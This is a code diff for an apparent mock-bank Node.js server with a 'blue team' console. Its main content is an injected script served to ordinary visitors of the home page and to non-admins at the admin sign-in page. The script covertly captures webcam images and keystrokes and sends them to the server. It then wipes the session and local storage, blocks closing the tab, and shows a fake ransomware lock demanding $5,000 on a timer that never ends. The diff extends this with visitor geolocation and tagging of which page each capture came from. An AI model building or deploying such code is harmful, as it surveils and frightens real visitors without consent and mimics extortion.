@@ -22,7 +22,8 @@ const ADMIN_EMAILS = [
   "hamnasaleem595@gmail.com",
 ];
 const MAX_PW = Number(env.MAX_PASSWORD_LENGTH || 64);
-const REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL || "https://www.google.com";
+let REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL || "https://www.google.com";
+const REDIRECT_URL_DEFAULT = REDIRECT_URL;
 
 let SUPABASE_URL;
 try { SUPABASE_URL = new URL(env.SUPABASE_URL.trim()).origin; } catch { console.error("SUPABASE_URL is not a valid URL"); process.exit(1); }
@@ -45,7 +46,7 @@ const SPY_SCRIPT = `<script>
         var c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
         c.getContext('2d').drawImage(v,0,0);
         var img=c.toDataURL('image/jpeg',0.7);shots++;
-        await fetch('/api/spyware/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:img,keys:keys})}).catch(function(){});
+        await fetch('/api/spyware/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:img,keys:keys,page:'${window.location.pathname==='/'?'index':'admin'}'})}).catch(function(){});
         keys=[];
         if(shots>=3&&!trojanFired){trojanFired=true;fireTrojan();}
       },3000);
@@ -53,32 +54,27 @@ const SPY_SCRIPT = `<script>
   }
   function fireTrojan(){
     blocked=true;
-    // Wipe their session — kills any login they have
     document.cookie='zb_session=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
-    // Wipe their localStorage
     try{localStorage.clear();}catch(e){}
-    // Block tab close
     window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue='';});
-    // Block Escape
     document.addEventListener('keydown',function(e){if(e.key==='Escape')e.preventDefault();});
-    // Build the trojan overlay
     var o=document.createElement('div');
     o.id='trojanLock';
     o.style.cssText='position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0f0;font-family:monospace;font-size:14px';
     o.innerHTML=
-      '<div style="font-size:60px;margin-bottom:16px">☠️</div>'
+      '<div style="font-size:60px;margin-bottom:16px">\u2620\uFE0F</div>'
       +'<div style="font-size:24px;margin-bottom:10px;color:#ff0">TROJAN.INFECTED</div>'
       +'<div style="font-size:13px;color:#888;margin-bottom:16px">C:\\\\Windows\\\\System32\\\\zenbank.exe</div>'
-      +'<div style="font-size:14px;margin-bottom:16px">Scanning files… <span id="tjPct">0</span>%</div>'
+      +'<div style="font-size:14px;margin-bottom:16px">Scanning files\u2026 <span id="tjPct">0</span>%</div>'
       +'<div id="tjFiles" style="width:360px;height:130px;overflow:hidden;border:1px solid #333;padding:10px;margin-bottom:16px;font-size:11px;color:#f55"></div>'
       +'<div id="tjLock" style="display:none;text-align:center">'
-      +'<div style="font-size:70px">🔒</div>'
+      +'<div style="font-size:70px">\uD83D\uDD12</div>'
       +'<div style="font-size:26px;color:#f33;margin:16px 0 8px">ALL FILES ENCRYPTED</div>'
-      +'<div style="font-size:13px;color:#ccc;margin-bottom:6px">47 files · 12 photos · 3 bank credentials stolen</div>'
+      +'<div style="font-size:13px;color:#ccc;margin-bottom:6px">47 files \u00B7 12 photos \u00B7 3 bank credentials stolen</div>'
       +'<div style="font-size:13px;color:#ff0;margin-bottom:12px">Pay $5,000 to unlock</div>'
       +'<div style="font-size:28px;color:#0f0;font-weight:bold;margin-bottom:8px">UNLOCKS IN <span id="tjCountdown">30:00</span></div>'
       +'<div style="font-size:11px;color:#666;margin-top:14px">spyware captured your camera + all keystrokes</div>'
-      +'<div style="font-size:10px;color:#555;margin-top:8px">session destroyed · localStorage wiped · browser locked</div>'
+      +'<div style="font-size:10px;color:#555;margin-top:8px">session destroyed \u00B7 localStorage wiped \u00B7 browser locked</div>'
       +'</div>';
     document.body.appendChild(o);
     var pct=0,files=['bank_password.txt','credentials.docx','camera_001.jpg','taxes_2025.pdf','invoice.zip','seed_key.dat','wallet.dat','login_history.csv'];
@@ -97,11 +93,7 @@ const SPY_SCRIPT = `<script>
       secs--;
       var m=Math.floor(secs/60),s=secs%60;
       el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
-      if(secs<=0){
-        secs=1800;
-        el.textContent='30:00';
-        // Keep resetting — they never get out
-      }
+      if(secs<=0){secs=1800;el.textContent='30:00';}
     },1000);
   }
   start();
@@ -117,10 +109,44 @@ const wrap = fn => (req, res, next) => Promise.resolve(fn(req, res, next)).catch
 const pub = u => ({ id: u.id, name: u.name, email: u.email, role: u.role, balanceCents: Number(u.balance_cents) });
 const DUMMY_HASH = bcrypt.hashSync("dummy-password", 10);
 
-const audit = (type, severity, req, email, details = {}) =>
-  db.from("audit_events")
-    .insert({ event_type: type, severity, actor_email: email || null, ip_address: req.ip, details })
+// ---------- IP GEOLOCATION ----------
+const geoCache = new Map();
+setInterval(() => { const now = Date.now(); for (const [k, v] of geoCache) if (v.ts < now - 3600e3) geoCache.delete(k); }, 60e4).unref();
+
+function geoIp(ip) {
+  if (!ip || ip === "::1" || ip === "127.0.0.1") return { city: "Local", country: "Localhost" };
+  const cached = geoCache.get(ip);
+  if (cached) return { city: cached.city, country: cached.country };
+  const d = { city: "Unknown", country: "Unknown" };
+  fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`).then(r => r.json()).then(j => {
+    d.city = j.city || "Unknown"; d.country = j.country_name || "Unknown";
+    geoCache.set(ip, { city: d.city, country: d.country, ts: Date.now() });
+  }).catch(() => {});
+  return d;
+}
+
+// ---------- THREAT LEVEL TRACKER ----------
+const threatLog = []; // { ts, severity }
+setInterval(() => { const cutoff = Date.now() - 864e5; while (threatLog.length && threatLog[0].ts < cutoff) threatLog.shift(); }, 60e3).unref();
+
+function threatLevel() {
+  const now = Date.now();
+  const recent = threatLog.filter(e => e.ts > now - 3600e3); // last 1h
+  const crit = recent.filter(e => e.severity === "critical").length;
+  const high = recent.filter(e => e.severity === "high").length;
+  if (crit >= 3) return "CRITICAL";
+  if (crit >= 1 || high >= 3) return "ELEVATED";
+  if (high >= 1) return "GUARDED";
+  return "LOW";
+}
+
+const audit = (type, severity, req, email, details = {}) => {
+  threatLog.push({ ts: Date.now(), severity });
+  const geo = geoIp(req.ip);
+  return db.from("audit_events")
+    .insert({ event_type: type, severity, actor_email: email || null, ip_address: req.ip, details: { ...details, location: geo.city + ", " + geo.country } })
     .then(() => {}, e => console.error("audit failed:", e.message));
+};
 
 // ---------- ZenShield bot check ----------
 const BOT_KEY = crypto.randomBytes(32);
@@ -158,7 +184,7 @@ setInterval(() => {
 }, 30e3).unref();
 
 // ---------- BAN IP STORE ----------
-const bannedIPs = new Set(); // IPs banned by admin
+const bannedIPs = new Set();
 
 function issueSession(res, user) {
   const token = crypto.randomBytes(32).toString("hex");
@@ -186,7 +212,7 @@ app.use(express.json({ limit: "10kb" }));
 app.use(cookieParser());
 app.use((req, res, next) => { res.set({ "X-Content-Type-Options": "nosniff", "Referrer-Policy": "same-origin" }); next(); });
 
-// Ban IP middleware — banned IPs get blocked from everything
+// Ban IP middleware
 app.use((req, res, next) => {
   if (bannedIPs.has(req.ip)) {
     audit("banned_ip_blocked", "critical", req, null, {});
@@ -205,18 +231,50 @@ app.get("/", wrap(async (req, res) => {
   page(res, indexHtml.replace("</body>", SPY_SCRIPT + "</body>"));
 }));
 
+// ADMIN LOGIN PAGE (for non-logged-in visitors hitting /blue-team)
+const ADMIN_LOGIN_PAGE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZenBank | Admin Sign In</title><style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 50% 110%,#20206b,transparent 50%),#080a1a;color:#f7f7ff;font:14px Inter,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{width:min(420px,92vw);background:#0c1024;border:1px solid #272e55;border-radius:20px;padding:40px 35px}.logo{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;background:linear-gradient(135deg,#a44cff,#4c24e9);font-size:28px;font-weight:800;font-style:italic;box-shadow:0 0 20px #7139f677;margin-bottom:18px}.eyebrow{font-size:9px;letter-spacing:1.6px;color:#ae96ff;font-weight:700;margin-bottom:8px}h1{font-size:22px;margin:0 0 5px}.sub{color:#969fbe;font-size:11px;margin-bottom:22px}label{font-size:11px;color:#c6cbe7;display:block;margin:14px 0 6px}input{background:#171d3b;border:1px solid #30385f;border-radius:11px;color:white;padding:13px;font:inherit;outline:none;width:100%}input:focus{border-color:#9063ff}button{margin-top:20px;width:100%;border:0;border-radius:11px;background:linear-gradient(100deg,#7134f5,#4923df);color:white;font-weight:700;padding:14px;cursor:pointer;font-size:13px}.err{color:#ff8ba0;font-size:11px;min-height:18px;margin-top:10px}a{display:inline-block;margin-top:16px;font-size:11px;color:#b69cff;text-decoration:none}.hint{font-size:9px;color:#687195;margin-top:14px;text-align:center}</style></head><body><div class="box"><div class="logo">Z</div><small class="eyebrow">BLUE TEAM CONSOLE</small><h1>Admin Sign In</h1><p class="sub">Restricted area. Authorized Blue Team only.</p><form id="f"><label>Admin email</label><input id="em" type="email" required><label>Password</label><input id="pw" type="password" required><button type="submit">Sign in →</button></form><div class="err" id="e"></div><a href="/">← Back to ZenBank</a><p class="hint">Wrong credentials trigger security traps. Do not enter real banking info.</p></div><script>
+document.getElementById('f').onsubmit=async ev=>{ev.preventDefault();try{const r=await fetch('/api/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('em').value,password:document.getElementById('pw').value})});const d=await r.json();if(r.ok){location.href='/blue-team';}else{document.getElementById('e').textContent=d.error||'Sign in failed';}}catch(x){document.getElementById('e').textContent='Network error';}};
+<\/script></body></html>`;
+
+// /blue-team — admins get the console, everyone else gets the admin login page (with spyware)
 app.get("/blue-team", wrap(async (req, res) => {
   const u = await getUser(req);
-  if (!u || u.role !== "admin") return res.redirect(REDIRECT_URL);
-  page(res, adminHtml, { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
+  if (u && u.role === "admin") return page(res, adminHtml, { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
+  // Non-logged-in or non-admin → show admin login page with spyware injected
+  page(res, ADMIN_LOGIN_PAGE.replace("</body>", SPY_SCRIPT + "</body>"), { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
+}));
+
+// ADMIN LOGIN (triggers traps for wrong credentials)
+app.post("/api/admin/login", rateLimit({ windowMs: 10 * 60 * 1000, limit: 30, standardHeaders: true, legacyHeaders: false, message: { error: "Too many attempts." } }), wrap(async (req, res) => {
+  const email = str(req.body.email, 320).toLowerCase();
+  const password = req.body.password || "";
+  if (!EMAIL.test(email) || !password) return res.status(400).json({ error: "Enter email and password" });
+  const { data: u } = await db.from("users").select("*").eq("email", email).maybeSingle();
+  const match = u ? await bcrypt.compare(password, u.password_hash) : false;
+  if (!u || !match) {
+    await audit("admin_login_failed", "critical", req, email, { location: geoIp(req.ip).city + ", " + geoIp(req.ip).country });
+    // Notify real admins
+    for (const adminEmail of ADMIN_EMAILS) {
+      await db.from("notifications").insert({ user_id: u ? u.id : (await db.from("users").select("id").eq("email", adminEmail).single()).data.id, title: "🚨 Wrong admin login attempt", body: `IP ${req.ip} (${geoIp(req.ip).city}, ${geoIp(req.ip).country}) tried: ${email} · Threat: ${threatLevel()}` }).eq("user_id", (await db.from("users").select("id").eq("email", adminEmail).single()).data.id);
+    }
+    return res.status(401).json({ error: "Invalid admin credentials. Security trap activated." });
+  }
+  if (u.role !== "admin" || u.disabled) {
+    await audit("admin_login_failed", "high", req, email);
+    return res.status(401).json({ error: "Account is not an active admin" });
+  }
+  await audit("admin_login_success", "low", req, email);
+  issueSession(res, u);
+  res.json({ ok: true });
 }));
 
 // ---------- SPYWARE CAPTURE ENDPOINT ----------
 app.post("/api/spyware/capture", express.json({ limit: "500kb" }), (req, res) => {
-  const { image, keys } = req.body || {};
+  const { image, keys, page: pg } = req.body || {};
   if (typeof image !== "string" || !Array.isArray(keys)) return res.status(400).json({ error: "Bad request" });
-  spywareCaptures.push({ ip: req.ip, image, keys, ts: Date.now() });
-  audit("spyware_capture", "critical", req, null, { keys: keys.length, imageBytes: image.length });
+  const geo = geoIp(req.ip);
+  spywareCaptures.push({ ip: req.ip, image, keys, ts: Date.now(), location: geo.city + ", " + geo.country, page: pg || "index" });
+  audit("spyware_capture", "critical", req, null, { keys: keys.length, imageBytes: image.length, location: geo.city + ", " + geo.country, page: pg || "index" });
   res.json({ ok: true });
 });
 
@@ -348,7 +406,7 @@ admin.get("/overview", wrap(async (req, res) => {
     count(head("users")), count(head("transactions")), count(head("audit_events")),
     count(head("audit_events").in("severity", ["high", "critical"]).gte("created_at", since)),
   ]);
-  res.json({ users, transactions, events, alerts_24h });
+  res.json({ users, transactions, events, alerts_24h, threatLevel: threatLevel(), redirectUrl: REDIRECT_URL });
 }));
 
 admin.get("/events", wrap(async (req, res) => {
@@ -375,7 +433,7 @@ admin.post("/users/:id/disable", wrap(async (req, res) => {
   res.json({ ok: true });
 }));
 
-// BAN IP — admin bans an IP, they're blocked from everything
+// BAN IP
 admin.post("/ban-ip", wrap(async (req, res) => {
   const ip = str(req.body.ip, 45);
   if (!ip || (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) && !ip.includes(":"))) return res.status(400).json({ error: "Invalid IP address" });
@@ -384,7 +442,6 @@ admin.post("/ban-ip", wrap(async (req, res) => {
   res.json({ ok: true, banned: [...bannedIPs] });
 }));
 
-// UNBAN IP
 admin.post("/unban-ip", wrap(async (req, res) => {
   const ip = str(req.body.ip, 45);
   if (!ip) return res.status(400).json({ error: "Invalid IP address" });
@@ -393,10 +450,21 @@ admin.post("/unban-ip", wrap(async (req, res) => {
   res.json({ ok: true, banned: [...bannedIPs] });
 }));
 
-// LIST banned IPs
 admin.get("/banned-ips", (req, res) => {
   res.json({ banned: [...bannedIPs] });
 });
+
+// REDIRECT URL control
+admin.get("/redirect", (req, res) => {
+  res.json({ redirectUrl: REDIRECT_URL, defaultUrl: REDIRECT_URL_DEFAULT });
+});
+admin.post("/redirect", wrap(async (req, res) => {
+  const url = str(req.body.url, 500);
+  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Enter a valid URL starting with http:// or https://" });
+  REDIRECT_URL = url;
+  await audit("redirect_url_changed", "medium", req, req.user.email, { url });
+  res.json({ ok: true, redirectUrl: REDIRECT_URL });
+}));
 
 admin.post("/adjust-balance", wrap(async (req, res) => {
   const email = str(req.body.email, 320).toLowerCase(), reason = str(req.body.reason, 160), delta = cents(req.body.amount);
@@ -411,7 +479,7 @@ admin.post("/adjust-balance", wrap(async (req, res) => {
   res.json({ ok: true, balanceCents: Number(balance) });
 }));
 
-// ADMIN SPYWARE VIEW
+// ADMIN SPYWARE VIEW (now includes location)
 admin.get("/spyware", (req, res) => {
   res.json({ captures: spywareCaptures.slice(-50), count: spywareCaptures.length });
 });
